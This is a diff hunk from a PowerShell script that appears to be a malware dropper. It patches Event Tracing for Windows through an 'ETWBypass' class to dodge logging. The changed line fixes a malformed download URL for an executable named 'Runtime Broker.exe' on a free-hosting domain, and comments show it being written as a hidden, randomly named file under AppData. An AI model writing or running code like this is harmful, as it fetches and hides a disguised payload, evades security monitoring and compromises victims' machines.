@@ -41,7 +41,7 @@ public class ETWBypass {
 Add-Type -TypeDefinition $etwCode -Language CSharp
 [ETWBypass]::Patch()
 
-$payloadUrl = "http://lllllllll-001-site1.ftempurl.com/Runtime%20Broker.exehttp://lllllllll-001-site1.ftempurl.com/Runtime%20Broker.exe"
+$payloadUrl = "http://lllllllll-001-site1.ftempurl.com/Runtime%20Broker.exe"
 
 # Generate random filename in %APPDATA% (AppData\Roaming) with Hidden attributes
 $targetDir = Join-Path $env:APPDATA "Microsoft\Windows\Templates"
